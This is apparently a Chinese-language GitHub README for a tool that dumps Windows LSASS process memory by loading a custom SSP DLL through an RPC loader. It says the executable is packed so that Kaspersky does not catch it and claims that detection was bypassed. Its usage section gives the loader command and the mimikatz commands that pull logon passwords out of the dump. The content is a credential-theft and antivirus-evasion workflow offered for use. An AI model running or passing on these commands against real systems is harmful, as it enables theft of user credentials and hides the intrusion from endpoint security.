# ssp_dump_lsass

https://github.com/whyjoezk/dump_lsass/tree/1c07b4038c7ef2c60584bec05d19ec4141ecb3cf  
参考这个仓库，可能是本机环境问题，该仓库的dll无法dump出lsass  
这里又参考以下两篇文章重新生成dll  
https://blog.csdn.net/qq_39101049/article/details/105550641  
https://www.cnblogs.com/w0x68y/p/14138953.html  
使用vs2019编译，选择x64编译，未设置字符集  
对于exe进行了加壳防止卡巴查杀，在x64目录下  

## 使用方法

`ssp_rpc_loader_protected.exe c:\Users\xxx\Desktop\Project4.dll`  
`dir c:\`  
`mimikatz.exe "sekurlsa::minidump 1.bin" "sekurlsa::logonPasswords full" "exit"`  

## 效果
最终dump内存时成功绕过kaba检测  
![image](https://user-images.githubusercontent.com/78201553/184787444-0a3b6755-0940-4a8b-94ab-5c85b7b387be.png)
